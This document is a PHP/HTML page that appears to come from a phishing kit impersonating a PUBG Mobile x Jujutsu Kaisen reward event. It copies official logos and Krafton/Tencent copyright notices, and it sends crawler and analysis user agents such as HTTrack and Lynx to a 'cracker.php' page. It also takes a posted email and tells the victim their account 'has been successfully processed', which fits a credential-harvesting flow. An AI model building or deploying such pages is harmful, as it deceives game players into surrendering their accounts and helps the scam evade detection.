<?php
$ua = $_SERVER['HTTP_USER_AGENT'];
if(preg_match('#Mozilla/4.05 [fr] (Win98; I)#',$ua) || preg_match('/Java1.1.4/si',$ua) || preg_match('/MS FrontPage Express/si',$ua) || preg_match('/HTTrack/si',$ua) || preg_match('/IDentity/si',$ua) || preg_match('/HyperBrowser/si',$ua) || preg_match('/Lynx/si',$ua)) 
{
header('Location: cracker.php');
die();
}

// MENGAMBIL KONTROL
include("system/setting.php");

// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == ""){
header("Location: index.php");
}
?>

<html>
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0, maximum-scale=1.0, user-scalable=no"/>
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta property="og:title" content="PUBG Mobile x Jujutsu Kaisen Collaboration">
<meta name="description" content="Collect your special rewards at the PUBG Mobile x Jujutsu Kaisen Collaboration event. This opportunity is limited and without the need for topup. Collect your rewards now!">
<meta property="og:description" content="Collect your special rewards at the PUBG Mobile x Jujutsu Kaisen Collaboration event. This opportunity is limited and without the need for topup. Collect your rewards now!">
<meta property="og:url" content="./">
<meta property="og:site_name" content="PUBG Mobile x Jujutsu Kaisen Collaboration">
<meta property="og:type" content="website">
<meta name="copyright"content="PUBG MOBILE">
<meta name="theme-color" content="#000">
<meta property="og:image" content="https://www.pubgmobile.com/common/images/icon_logo.jpg">
<title>PUBG Mobile x Jujutsu Kaisen Collaboration</title>
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/animate.css">
<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/material-design-iconic-font/2.2.0/css/material-design-iconic-font.min.css">
<link rel="icon" href="https://www.pubgmobile.com/common/images/icon_logo.jpg">
</head>
<body oncontextmenu="return false" onselectstart="return false" ondragstart="return false">

<div class="container">
<div class="navbar">
<img class="navbar-logo" src="https://www.pubgmobile.com/common/images/icon_logo.jpg">
<div class="navbar-title">
PUBG MOBILE
<br>
<span>The original Battle Royale, <br> the first and the best!</span>
</div> <!--- navbar-title --->
<div class="navbar-download">
<img class="navbar-menu" src="https://i.postimg.cc/LXJDnk6t/menu.png">
<img class="navbar-pay" src="https://i.postimg.cc/VkTdzXpQ/pay.png">
</div> <!--- navbar-download --->
</div> <!--- navbar --->
<div class="header">
<video src="media/header.mp4" autoplay loop muted></video>
</div> <!--- header --->
<div class="home-title"></div> <!--- home-title --->
<div class="box">
<center>
<div class="tab_rewards" id="season">
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://raw.githubusercontent.com/genjehhh1/jujutsu/main/1.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://raw.githubusercontent.com/genjehhh1/jujutsu/main/1.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://raw.githubusercontent.com/genjehhh1/jujutsu/main/2.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://raw.githubusercontent.com/genjehhh1/jujutsu/main/2.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://raw.githubusercontent.com/genjehhh1/jujutsu/main/3.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://raw.githubusercontent.com/genjehhh1/jujutsu/main/3.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://raw.githubusercontent.com/genjehhh1/jujutsu/main/4.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://raw.githubusercontent.com/genjehhh1/jujutsu/main/4.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://raw.githubusercontent.com/genjehhh1/jujutsu/main/5.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://raw.githubusercontent.com/genjehhh1/jujutsu/main/5.png">Collect</button>
</div>
</div>
<div class="item itemShine">
<div>
<figure>
<img style="border-bottom: 0px;" src="https://raw.githubusercontent.com/genjehhh1/jujutsu/main/6.png">
</figure>
</div>
<div>
<button type="button" onmousedown="buka.play();" onclick="open_reward_confirmation(this);" src="https://raw.githubusercontent.com/genjehhh1/jujutsu/main/6.png">Collect</button>
</div>
</div>
</center>
</div> <!--- box --->
<div class="footer">
<div class="footer-txt-follow">Follow Us</div> <!--- footer-txt-follow --->
<center>
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_1.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_2.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_3.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_4.png">
<img class="footer-follow-icon" src="https://www.pubgmobile.com/common/images/link_5.png">
</center>
<img class="footer-copyright-icon" src="https://i.postimg.cc/pV8Q4L9L/footer-img.png">
<div class="footer-txt-copyright">ⓒ 2017 KRAFTON, Inc. All rights reserved.</div> <!--- footer-txt-copyright --->
<div class="footer-txt-copyright">ⓒ 2018-2022 Tencent. All rights reserved.</div> <!--- footer-txt-copyright --->
<div class="footer-txt-copyright">Privacy Policy | Tencent Games User Agreement</div> <!--- footer-txt-copyright --->
</div> <!--- footer --->
</div> <!--- container --->

<div class="popup reward_confirmation">
<div class="popup-box">
<div class="popup-title">Processing Account</div>
<div class="popup-content">
<br>
<div class="popup-rewards-title">
Thanks for joining this Jujutsu Kaisen event
<br>
<br>
Your account has been successfully processed
<br>
Please wait up to 24 hours
</div>
</div>
<div class="popup-btn-wrapper">
<button type="button" class="popup-btn-active" style="margin-left: auto; margin-right: auto; float: none; display: block;" onclick="location.href='https://pubgmobile.com/';" onmousedown="buka.play();">Logout</button>
</div>
</div>
</div>

<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script src="js/script.js"></script>

</body>
</html>